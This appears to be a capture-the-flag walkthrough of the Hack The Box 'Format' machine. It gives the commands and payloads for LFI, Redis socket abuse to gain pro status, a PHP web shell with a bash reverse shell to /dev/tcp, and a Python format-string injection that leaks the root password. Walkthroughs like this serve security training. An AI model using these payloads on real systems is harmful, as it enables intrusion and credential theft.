![Format-1024x775](https://github.com/st1llz0r/Format/assets/142597099/41c58bf0-ac14-41de-9e74-8d425beeeefb)

Let's go

information collection;
  Scanning target host.

nmap -sS -sVC target ip;

![image](https://github.com/st1llz0r/Format/assets/142597099/6773bb04-d5b4-4b0d-bbb6-d7159a9cbafb)

  Navigate to target IP port 80;
  Nothing, so try and Spoof DNS;

 <b> echo '10.10.11.213 microblog.htb' >> /etc/hosts </b>;

 Trying again, we can discover http://app.microblog.htb, therefore spoof it. bind the domain to hosts file;

 Browser input > http://app.microblog.htb;

 Browse the web app and see what functionalities it has;

 Create an account and publish your own blog. Test out the Editing page and so on;

 On the editing page let's try and see how the web page reacts to basic XSS; Use the h1 option and input:

 <b> <script>alert(1)</script> </b>;

 Hmm, interesting result;

 Now let's try something crispier;

 Now let's change it to text and capture the traffic by using Burpy suite;

 Analyze the pack

  ![image](https://github.com/st1llz0r/Format/assets/142597099/52e58d19-1292-4a6a-a383-98a9ca924351)

  After analyzing let's start with basic stuff, basic LFI:

 ![image](https://github.com/st1llz0r/Format/assets/142597099/dfc3ff0a-2bac-4c0c-9bcb-cf08433e7a27)


n0w navigate to your browser and refresh:

 ![image](https://github.com/st1llz0r/Format/assets/142597099/2f0d0e67-ddc0-4af7-81e6-10b07a060be5)

Pew pew pew pew
We got a lead
redis and git and user
let's navigate to http://microblog.htb:3000/

Who would ve thought =D



![image](https://github.com/st1llz0r/Format/assets/142597099/e5e3b712-7d3c-45d5-8552-d3b320d04135)



![image](https://github.com/st1llz0r/Format/assets/142597099/12aee48a-ae78-492a-9a95-a12172e64969)


So, there is this Cooper guy (USER) who has created this sunny (blog domain);

Site is pretty basic as in infrastructure so the folders and all will apply for our account also;

Go into the Sunny Folder > check index.php and analyze code;

```php
<?php
$username = session_name("username");
session_set_cookie_params(0, '/', '.microblog.htb');
session_start();

function checkAuth() {
    return(isset($_SESSION['username']));
}

function checkOwner() {
    if(checkAuth()) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
        $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
        if(in_array($subdomain, $userSites)) {
            return $_SESSION['username'];
        }
    }
    return "";
}

function getFirstName() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $firstName = $redis->HGET($_SESSION['username'], "first-name");
        return "\"" . ucfirst(strval($firstName)) . "\"";
    }
}

function fetchPage() {
    chdir(getcwd() . "/content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line}\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}

?>
<!DOCTYPE html>
<head>
<link rel="icon" type="image/x-icon" href="/images/brain.ico">
<link rel="stylesheet" href="http://microblog.htb/static/css/styles.css">
<script src="http://microblog.htb/static/js/jquery.js"></script>
<title></title>
<script>
    $(window).on('load', function(){
        const html = <?php echo json_encode(fetchPage()); ?>.replace(/(\r\n|\n|\r)/gm, "");
        $(".push-for-h1").after(html);
        if(html.length === 0) {
            $(".your-blog").after("<div class = \"empty-blog\">Blog in progress... check back soon!</div>");
            $(".push-for-h1").css("display", "none");
        }
        const siteOwner = <?php echo json_encode(checkOwner()); ?>;
        if(siteOwner.length > 0) {
            $(".your-blog").css("display", "flex");
            $(".user-first-name").text(<?php echo getFirstName(); ?>);
        }
        const class_after_push = $(".push-for-h1").next().children().attr('class');
        if(class_after_push) {
            if(class_after_push.includes("blog-h1")) {
                $(".push-for-h1").css("display", "none");
            }
        }

        const blogName = String(window.location).split('.')[0].split('//')[1]
        document.title = blogName + " - Microblog"
    });
</script>
</head>
<body>
    <div class = "your-blog">
        <div><span class = "user-first-name"></span>, this is your blog! <a href = "/edit" style = "color: white;"><b>Edit it here.</b></a></div>
    </div>
    <div class = "push-for-h1" style = "min-height: 25px;"></div>
    <footer>
        © 2022 Microblog<br/>
        <a href="https://www.vecteezy.com/free-vector/brain">Brain Vectors by Vecteezy</a>
    </footer>
</body>
</html>

```
This provisionProUser () function seems to set a USER to be a PRO USER;

isPro () instructs us how to;

So we need to use a redis command in order to make our account PRO user;

Worth to check https://redis.io/commands/hset/;

```php

curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:YOUR_USERNAME%20pro%20true%20/b"

```

![image](https://github.com/st1llz0r/Format/assets/142597099/4b0d839a-ea34-41cc-994f-3d5294c51705)

![image](https://github.com/st1llz0r/Format/assets/142597099/abcc5c4d-09cf-4f73-9e47-18dcb43330c0)

Oulalala, if we check top right corner, now we are PRO USER and we can upload images also :P;

Upload a few images, add text and now using the text add function on the blog editor turn on Burpy suite and intercept again;
Now send to repeater and modify it this way:

![image](https://github.com/st1llz0r/Format/assets/142597099/4d8b101a-ec2c-42e7-91ce-63cdee8ffe58)

Before hitting send open NC set it to desired port;

![image](https://github.com/st1llz0r/Format/assets/142597099/cb1ba58b-c329-4649-9b48-2b1896955a2c)


```php


id=/var/www/microblog/blog_name/uploads/rev.php&txt=<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/IP/PORT+0>%261'")%3b%3f>

```
Hit SEND on Repeater Burpy;

Navigate to: http://sarmale.microblog.htb/uploads/rev.php (OFC CHANGE TO YOUR BLOG)

![image](https://github.com/st1llz0r/Format/assets/142597099/aa70134b-2690-4491-a089-97c865a234b6)





<b> WE GOT IT </b>

![image](https://github.com/st1llz0r/Format/assets/142597099/84984c3c-9713-4cb3-b344-8c2e4da6f69e)

RUN REDIS: 

redis-cli -s /var/run/redis/redis.sock;

KEYS;


![image](https://github.com/st1llz0r/Format/assets/142597099/2f1866d5-83c0-40b7-8d29-b183ed277d3c)

cooper.dooper spotted;

hgetall cooper.dooper;

![image](https://github.com/st1llz0r/Format/assets/142597099/fd74c8f3-1a1c-4ddb-89f0-8ac01fd29612)


ssh cooper@10.10.11.213;

![image](https://github.com/st1llz0r/Format/assets/142597099/da9a205d-c28a-4902-bbe2-312e54d78822)

![image](https://github.com/st1llz0r/Format/assets/142597099/a3859395-e9b0-4085-9429-8f4e9fa8ab61)

run sudo -l;


![image](https://github.com/st1llz0r/Format/assets/142597099/518bbe39-ac6c-4942-bbb9-bdeaa6c4e78c)

cat /usr/bin/license

```python3

#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")

```
Analyze code;

Understand how it fetches data in order to get a license key;

connect to redis once more;

redis-cli -s /run/redis/redis.sock;

So after analyzing the code we have noticed that it needs first name, last name and username. Learn about Python string vulnerabilities and write it with redis and then read it as usr;

HMSET evil first-name "{license.__init__.__globals__[secret_encoded]}" last-name evil username hecked;

exit;

run sudo /usr/bin/license -p evil (as USER cooper);


![image](https://github.com/st1llz0r/Format/assets/142597099/520a64ab-bf34-46ef-864a-4c3539a4041d)

Read carefully the output;

unCR4ckaBL3Pa$$w0rd - this is root PW;

GGWP;

Run sudo su;

enter pass: unCR4ckaBL3Pa$$w0rd;


cat root.txt

echo it

![image](https://github.com/st1llz0r/Format/assets/142597099/0ade631b-49d4-4573-80b9-07152ff5d28a)

*** LAST IMPORTANT STEP, BE A CHEAP TROLL;

![image](https://github.com/st1llz0r/Format/assets/142597099/28388d44-bea5-486b-949e-548773d6c55a)

*** =D JUST FOR THE SAKE OF THIS OK?

![image](https://github.com/st1llz0r/Format/assets/142597099/9c4ec536-f09e-4684-b742-6b6fbe4cfd28)

